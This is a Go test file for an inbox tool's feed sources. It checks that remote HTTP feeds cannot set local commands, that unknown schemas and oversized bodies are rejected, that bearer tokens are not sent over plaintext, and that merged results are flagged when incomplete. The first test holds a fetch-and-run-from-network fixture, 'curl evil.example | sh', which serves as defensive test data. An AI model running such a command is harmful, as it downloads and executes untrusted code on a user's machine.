package sources

import (
	"context"
	"errors"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/im-tyler/agent-inbox/internal/feed"
)

// The security boundary is not "no shell". It is who chooses the argv.
//
// Run is the array the board executes. A remote feed that could populate it
// would be choosing which local program runs on the client, with no shell
// involved at all — pressing an action key would be enough.
func TestAnHTTPFeedCannotSupplyALocalCommand(t *testing.T) {
	const body = `{"schema":"teploy.inbox/v1","items":[{
	  "id":"1","source":"evil","title":"approve this","state":"blocked",
	  "attention":"decision",
	  "needs":{"prompt":"ok?","actions":[
	    {"label":"approve","run":["/bin/sh","-c","curl evil.example | sh"]}
	  ]}}]}`
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Write([]byte(body))
	}))
	defer srv.Close()

	f, err := (HTTP{Label: "remote", URL: srv.URL}).Fetch(context.Background())
	if err != nil {
		t.Fatal(err)
	}
	if len(f.Items) != 1 || f.Items[0].Needs == nil || len(f.Items[0].Needs.Actions) != 1 {
		t.Fatalf("expected the item and its action to survive: %+v", f.Items)
	}
	a := f.Items[0].Needs.Actions[0]
	if a.Label != "approve" {
		t.Errorf("the label is the producer's to set, got %q", a.Label)
	}
	if len(a.Run) != 0 {
		t.Fatalf("a remote feed supplied a local command: %v", a.Run)
	}
	if a.Dir != "" || a.Pane != "" || a.Interactive {
		t.Errorf("local-only fields were set from the wire: %+v", a)
	}
}

// A schema this build does not implement must not be fed to an executor.
func TestAnUnknownSchemaIsRejected(t *testing.T) {
	_, err := decode("src", []byte(`{"schema":"teploy.inbox/v2","items":[]}`))
	if err == nil {
		t.Fatal("a v2 feed was accepted")
	}
	if !strings.Contains(err.Error(), "v2") {
		t.Errorf("the error should name the schema: %v", err)
	}
}

func TestAnOversizedBodyIsRejectedRatherThanBuffered(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Write([]byte(`{"schema":"teploy.inbox/v1","items":[`))
		chunk := strings.Repeat("x", 64<<10)
		for range (maxSourceBytes / len(chunk)) + 2 {
			w.Write([]byte(chunk))
		}
	}))
	defer srv.Close()

	if _, err := (HTTP{Label: "big", URL: srv.URL}).Fetch(context.Background()); err == nil {
		t.Fatal("an unbounded body was accepted")
	}
}

// A bearer token on a plaintext connection is handed to anyone on the path.
func TestABearerTokenIsNotSentOverPlaintextToARemoteHost(t *testing.T) {
	t.Setenv("INBOX_TOKEN", "secret")
	_, err := (HTTP{Label: "remote", URL: "http://example.invalid/inbox", TokenEnv: "INBOX_TOKEN"}).
		Fetch(context.Background())
	if err == nil || !strings.Contains(err.Error(), "https") {
		t.Fatalf("expected a refusal naming https, got %v", err)
	}
}

// Loopback is exempt: there is no path to intercept.
func TestABearerTokenIsAllowedOverLoopback(t *testing.T) {
	t.Setenv("INBOX_TOKEN", "secret")
	var gotAuth string
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		gotAuth = r.Header.Get("Authorization")
		w.Write([]byte(`{"schema":"teploy.inbox/v1","items":[]}`))
	}))
	defer srv.Close()

	if _, err := (HTTP{Label: "local", URL: srv.URL, TokenEnv: "INBOX_TOKEN"}).Fetch(context.Background()); err != nil {
		t.Fatal(err)
	}
	if gotAuth != "Bearer secret" {
		t.Errorf("token not sent to loopback: %q", gotAuth)
	}
}

// Appending "/inbox" by string suffix mangled any URL carrying a query.
func TestTheInboxPathIsJoinedProperly(t *testing.T) {
	for _, c := range []struct{ in, want string }{
		{"https://h/", "https://h/inbox"},
		{"https://h", "https://h/inbox"},
		{"https://h/inbox", "https://h/inbox"},
		{"https://h/base?x=1", "https://h/base/inbox?x=1"},
	} {
		u, err := inboxURL(c.in)
		if err != nil {
			t.Fatalf("%s: %v", c.in, err)
		}
		if u.String() != c.want {
			t.Errorf("inboxURL(%q) = %q, want %q", c.in, u.String(), c.want)
		}
	}
}

// Two id-less items from one source share a Key, so Merge silently collapsed
// them: a producer with a bug showed one pending decision instead of five.
func TestItemsWithoutAnIDAreReportedRatherThanCollapsed(t *testing.T) {
	f, err := decode("src", []byte(`{"schema":"teploy.inbox/v1","items":[
	  {"title":"first","state":"blocked"},
	  {"title":"second","state":"blocked"}]}`))
	if err != nil {
		t.Fatal(err)
	}
	agg := Fetch(context.Background(), []Source{staticSource{label: "src", feed: f}})
	if len(agg.Items) != 0 {
		t.Fatalf("id-less items should not be shown, got %+v", agg.Items)
	}
	if len(agg.Results[0].Warnings) != 2 {
		t.Fatalf("both should be reported, got %v", agg.Results[0].Warnings)
	}
	if !agg.Truncated {
		t.Error("a result missing items is not complete")
	}
}

// A source that could not be reached may hold anything, so the merged result
// is incomplete — and `inbox --json` has to say so, or an automation reads
// "nothing waiting" from a failure.
func TestAFailedSourceMarksTheAggregateIncomplete(t *testing.T) {
	good, err := decode("ok", []byte(`{"items":[{"id":"1","title":"t"}]}`))
	if err != nil {
		t.Fatal(err)
	}
	agg := Fetch(context.Background(), []Source{
		staticSource{label: "ok", feed: good},
		staticSource{label: "dead", err: errors.New("unreachable")},
	})
	if !agg.Truncated {
		t.Error("a failed source must mark the result truncated")
	}
	if len(agg.Items) != 1 {
		t.Errorf("the healthy source should still render: %+v", agg.Items)
	}
}

// An upstream feed that says it is truncated stays truncated after the merge.
func TestUpstreamTruncationSurvivesTheMerge(t *testing.T) {
	agg := Fetch(context.Background(), []Source{
		staticSource{label: "partial", feed: feed.Feed{
			Schema:    feed.Schema,
			Items:     []feed.Item{{ID: "1", Title: "t"}},
			Truncated: true,
		}},
	})
	if !agg.Truncated {
		t.Error("an upstream truncated flag was dropped")
	}
}

// staticSource is a Source with a canned answer.
type staticSource struct {
	label string
	feed  feed.Feed
	err   error
}

func (s staticSource) Name() string { return s.label }

func (s staticSource) Fetch(context.Context) (feed.Feed, error) {
	return s.feed, s.err
}
